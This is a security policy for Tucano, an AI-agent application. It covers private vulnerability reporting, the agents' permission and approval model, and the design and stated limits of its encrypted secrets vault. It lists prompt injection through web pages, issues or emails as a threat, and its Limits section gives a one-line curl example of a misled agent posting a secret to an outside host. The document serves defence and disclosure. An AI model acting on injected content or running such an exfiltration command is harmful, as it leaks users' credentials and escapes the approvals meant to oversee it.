# Security

Tucano runs AI agents that can read your tools, run commands and click in a browser, so its permission model matters. If you find a way around it, please tell us privately.

## Reporting a vulnerability

Use [GitHub's private vulnerability reporting](https://github.com/eduwxyz/tucano/security/advisories/new). Please don't open a public issue. Include what an attacker could do, the steps to reproduce and the version you tested. You'll get an answer within a few days.

Especially interesting:

- an agent using a tool it wasn't granted, or a write tool with read-only access;
- a sensitive action running without its approval, or an approval that runs something other than what was shown;
- an agent reaching files outside its computer and the folders lent to it;
- content from a web page, an issue or an email making an agent act on its own (prompt injection that crosses a permission boundary);
- secrets (tokens, connector logins) leaving the vault-encrypted store (macOS Keychain, Linux keyring) or reaching a model.

## How Tucano keeps agents in bounds

- Each reply runs the harness CLI isolated from your personal configuration, with no built-in tools. Its only tools come from Tucano's local MCP gateway, through a secret per-turn URL that lists just that agent's tools; any other call is refused.
- Write actions that matter (merge, publish, send, delete) become an approval tied to the exact call and arguments. Approving runs exactly that call, after checking the grant again.
- Connector secrets are encrypted with a key in the macOS Keychain (on Linux, the system keyring: GNOME Keyring or KWallet) before they reach the database. Without a keyring, Tucano refuses to store them.
- The vault (**Settings › Vault**) keeps passwords, API keys, tokens and secret URLs for the agents. See [The vault](#the-vault) below.
- An agent's computer is a Docker container with only its own folder and the folders you lend it, or, if you choose so, your own computer.
- Everything stays on your computer: conversations, memory, logins. There is no Tucano server.

## The vault

Agents use a vault item by reference: they write `{{vault:name}}` in a tool's arguments. The value never reaches the agent, the model, the conversation, the steps, the approvals or the CLI's transcripts.

- **Where the value goes in.** It goes in only when the call runs, and only in Tucano's own tools:
  - in `vault_http`, sent only to the item's hosts, and a redirect is never followed;
  - in a command, as an environment variable of that process (`docker exec -e NAME`), so it's never in the command's text or in argv;
  - in a file written, text typed in the browser, or a connector's arguments, only for items allowed "in any tool".
- **What comes back.** Every value the agent may use is masked as `[vault:name]` before the model reads it. That covers the value as is, in JSON, base64, base64url, URL-encoded and hex. Values shorter than 6 characters are used but not masked.
- **Who uses an item.** Only the agents named, or every agent (agents created later too, never the Tuca). An item whose agents are all gone is used by no one. Using an item another agent owns reads the same as an unknown name. Every use and every refusal is logged with the agent and the tool.
- **Approvals.** An item can ask for approval on each use. After a reply reads something from outside (a page, a connector's answer), a use that can carry the value anywhere asks first, by the agent's outside-content guard. Approvals keep the reference and resolve it only once approved.
- **Encryption.**
  - Items are sealed with AES-256-GCM under a random vault key, bound to their id and version.
  - The vault key is wrapped by a random device key kept in the system's keychain (macOS Keychain, Windows DPAPI, GNOME Keyring or KWallet; on a server, the server's key). The vault opens on its own when Tucano starts, so routines keep working.
  - It is wrapped a second time by a recovery code, shown once, that opens the vault where the keychain is gone (a new computer, a restored backup). The code is derived with Argon2id (scrypt on a Node without it).
  - A copy of the database or a backup opens nothing without one of the two.
- **Write-only.** A value is typed once and never shown again. Editing writes a new one over it.
- **Limits.**
  - While Tucano runs with the vault open, whoever controls the computer (root, the administrator) can read the process's memory. On Linux and Windows, another program of the same user can ask the keychain for the device key while the session is unlocked. No vault that opens without a password avoids this.
  - An item allowed "in any tool" can be sent elsewhere by an agent that was misled (`curl https://elsewhere -d "$X"`). Masking hides values from the model, not from the network. Keep API keys on "Only in HTTP requests" with their hosts.
